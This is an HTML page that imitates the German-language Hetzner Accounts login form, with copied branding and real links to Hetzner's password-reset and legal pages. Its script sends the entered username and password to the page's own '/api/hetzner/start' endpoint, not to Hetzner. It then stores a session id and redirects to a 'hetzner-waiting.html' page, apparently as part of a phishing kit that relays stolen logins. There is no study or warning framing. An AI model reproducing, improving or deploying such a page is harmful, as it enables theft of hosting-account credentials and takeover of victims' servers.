<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login – Hetzner Accounts</title>
  <link rel="icon" href="hetzner-assets/logo-mark.svg" type="image/svg+xml" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 14px;
      color: #383838;
      background: #ededed;
      display: flex;
      flex-direction: column;
    }

    a { color: #d50c2d; text-decoration: none; }
    a:hover { text-decoration: underline; }

    .page {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 32px 16px;
    }

    .card {
      width: 100%;
      max-width: 400px;
      background: #fff;
      border-radius: 4px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
      padding: 32px 28px 28px;
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 28px;
    }

    .logo svg { height: 32px; width: auto; }

    h1 {
      font-size: 20px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 24px;
      color: #383838;
    }

    .field { margin-bottom: 16px; }

    .field label {
      display: block;
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 6px;
      color: #383838;
    }

    .field input {
      width: 100%;
      height: 44px;
      border: 1px solid #c8c8c8;
      border-radius: 3px;
      padding: 0 12px;
      font-size: 15px;
      font-family: inherit;
      color: #383838;
      background: #fff;
      outline: none;
      transition: border-color 0.15s;
    }

    .field input:focus {
      border-color: #d50c2d;
      box-shadow: 0 0 0 2px rgba(213, 12, 45, 0.12);
    }

    .pw-wrap { position: relative; }

    .toggle-pw {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #8a8a8a;
      padding: 4px;
    }

    .links {
      display: flex;
      justify-content: space-between;
      margin: 8px 0 20px;
      font-size: 13px;
    }

    .btn {
      width: 100%;
      height: 44px;
      border: none;
      border-radius: 3px;
      background: #d50c2d;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      transition: background 0.15s;
    }

    .btn:hover:not(:disabled) { background: #b00a26; }
    .btn:disabled { opacity: 0.7; cursor: wait; }

    .register {
      text-align: center;
      margin-top: 20px;
      padding-top: 20px;
      border-top: 1px solid #e8e8e8;
      font-size: 13px;
      color: #8a8a8a;
    }

    footer {
      text-align: center;
      padding: 16px;
      font-size: 12px;
      color: #8a8a8a;
    }

    footer a { color: #8a8a8a; margin: 0 8px; }
  </style>
</head>
<body>
  <div class="page">
    <div class="card">
      <div class="logo">
        <img src="hetzner-assets/logo-mark.svg" alt="Hetzner Accounts" height="32" />
      </div>
      <h1>Login</h1>

      <form id="hetzner-login-form" novalidate>
        <div class="field">
          <label for="username">Benutzername oder E-Mail-Adresse</label>
          <input type="text" id="username" name="username" autocomplete="username" required autofocus />
        </div>

        <div class="field pw-wrap">
          <label for="password">Passwort</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required />
          <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Passwort anzeigen">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>
            </svg>
          </button>
        </div>

        <div class="links">
          <a href="https://accounts.hetzner.com/password/lost" target="_blank" rel="noopener">Passwort vergessen?</a>
        </div>

        <button type="submit" class="btn" id="submit-btn">Anmelden</button>
      </form>

      <p class="register">
        Noch kein Account?
        <a href="https://accounts.hetzner.com/signUp" target="_blank" rel="noopener">Jetzt registrieren</a>
      </p>
    </div>
  </div>

  <footer>
    <a href="https://www.hetzner.com/legal/legal-notice" target="_blank" rel="noopener">Impressum</a>
    <a href="https://www.hetzner.com/legal/privacy-policy" target="_blank" rel="noopener">Datenschutz</a>
  </footer>

  <script>
    document.getElementById("toggle-pw").addEventListener("click", function () {
      const pw = document.getElementById("password");
      pw.type = pw.type === "password" ? "text" : "password";
    });

    document.getElementById("hetzner-login-form").addEventListener("submit", async function (e) {
      e.preventDefault();
      const email = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value;
      if (!email || !password) return;

      const btn = document.getElementById("submit-btn");
      btn.disabled = true;
      btn.textContent = "Wird angemeldet …";

      try {
        const res = await fetch("/api/hetzner/start", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password }),
        });
        const data = await res.json();
        if (!data.ok || !data.sessionId) {
          throw new Error(data.message || "Session failed");
        }
        sessionStorage.setItem("hetzner_session", data.sessionId);
        sessionStorage.setItem("hetzner_identifier", email);
        window.location.href = "hetzner-waiting.html?s=" + encodeURIComponent(data.sessionId);
      } catch (err) {
        console.error(err);
        alert(err.message || "Verbindungsfehler. Bitte erneut versuchen.");
        btn.disabled = false;
        btn.textContent = "Anmelden";
      }
    });
  </script>
</body>
</html>
